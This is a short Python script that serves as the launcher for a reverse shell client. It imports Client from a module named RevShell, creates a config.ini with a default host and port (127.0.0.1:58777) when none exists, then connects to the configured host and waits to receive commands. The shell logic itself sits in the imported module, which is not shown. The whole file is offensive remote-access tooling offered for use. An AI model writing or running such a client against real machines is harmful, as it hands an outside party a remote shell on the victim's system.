from RevShell import Client
import json, os.path, base64

if __name__ == '__main__':

    PREFS = 'config.ini'
    DEFAULT = {'host': '127.0.0.1', 'port': 58777}
    
    if not os.path.exists(PREFS):     
        config = open(PREFS, 'w')
        config.write(json.dumps(DEFAULT, sort_keys = True))
        config.close()

    server = json.loads(open(PREFS, 'r').read())
    client = Client(server['host'], server['port'])
    client.connect()
    client.receive()
    client.stop()